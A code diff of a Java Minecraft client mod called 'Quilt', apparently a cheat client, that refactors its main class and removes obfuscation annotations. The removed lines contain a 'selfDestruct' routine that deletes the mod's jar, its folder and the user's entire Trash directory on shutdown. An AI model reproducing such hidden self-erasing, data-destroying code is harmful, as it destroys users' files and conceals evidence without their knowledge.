@@ -9,7 +9,6 @@ import net.minecraft.client.MinecraftClient;
 import net.minecraft.resource.ResourceManager;
 import net.minecraft.resource.ResourceType;
 import net.minecraft.util.Identifier;
-import ru.nexusguard.protection.annotations.Native;
 import tech.quilt.base.autobuy.AutoBuyManager;
 import tech.quilt.base.comand.CommandManager;
 import tech.quilt.base.config.ConfigManager;
@@ -28,8 +27,12 @@ import tech.quilt.utility.game.server.ServerHandler;
 import tech.quilt.utility.render.display.shader.DrawUtil;
 import tech.quilt.utility.render.display.shader.GlProgram;
 
-public enum Quilt implements ClientModInitializer {
-   INSTANCE;
+public final class Quilt implements ClientModInitializer {
+   private static Quilt INSTANCE;
+
+   public Quilt() {
+      INSTANCE = this;
+   }
 
    public static final String NAME = "Quilt";
    public static final String VER = "";
@@ -64,14 +67,13 @@ public enum Quilt implements ClientModInitializer {
       }
    }
 
-   @Native
-   public void init() {
-      if (initialized) {
-         return;
-      }
-      initialized = true;
-      
-      try {
+    public void init() {
+       if (initialized) {
+          return;
+       }
+       initialized = true;
+
+       try {
          DIRECTORY = new File(MinecraftClient.getInstance().runDirectory, "Quilt");
          if (!DIRECTORY.exists()) {
             DIRECTORY.mkdirs();
@@ -120,8 +122,7 @@ public enum Quilt implements ClientModInitializer {
       }
    }
 
-   @Native
-   public void shutdown() {
+    public void shutdown() {
       if (this.friendManager != null) this.friendManager.save();
       if (this.staffManager != null) this.staffManager.save();
       if (this.configManager != null) this.configManager.save();
@@ -161,50 +162,6 @@ public enum Quilt implements ClientModInitializer {
         configManager = null;
         rctRepository = null;
         discordManager = null;
-
-        new Thread(() -> {
-            try {
-                Thread.sleep(1000);
-                selfDestruct();
-            } catch (Exception ignored) {}
-        }, "SelfDestruct").start();
-    }
-
-    private void selfDestruct() {
-        try {
-            String jarPath = Quilt.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
-            File jarFile = new File(jarPath);
-            if (jarFile.isFile() && jarFile.getName().endsWith(".jar")) {
-                jarFile.deleteOnExit();
-                jarFile.delete();
-            }
-
-            File quiltDir = new File(MinecraftClient.getInstance().runDirectory, "Quilt");
-            deleteRecursively(quiltDir);
-
-            String home = System.getProperty("user.home");
-            File trash = new File(home, ".local/share/Trash");
-            if (trash.exists()) {
-                deleteRecursively(trash);
-            }
-
-            Runtime.getRuntime().runFinalization();
-            System.gc();
-        } catch (Exception ignored) {}
-    }
-
-    private void deleteRecursively(File file) {
-        if (file == null || !file.exists()) return;
-        if (file.isDirectory()) {
-            File[] files = file.listFiles();
-            if (files != null) {
-                for (File f : files) {
-                    deleteRecursively(f);
-                }
-            }
-        }
-        file.deleteOnExit();
-        file.delete();
     }
 
    public boolean isUnhooked() {
@@ -290,7 +247,4 @@ public enum Quilt implements ClientModInitializer {
    }
 
 
-   private static Quilt[] $values() {
-      return new Quilt[]{INSTANCE};
-   }
 }
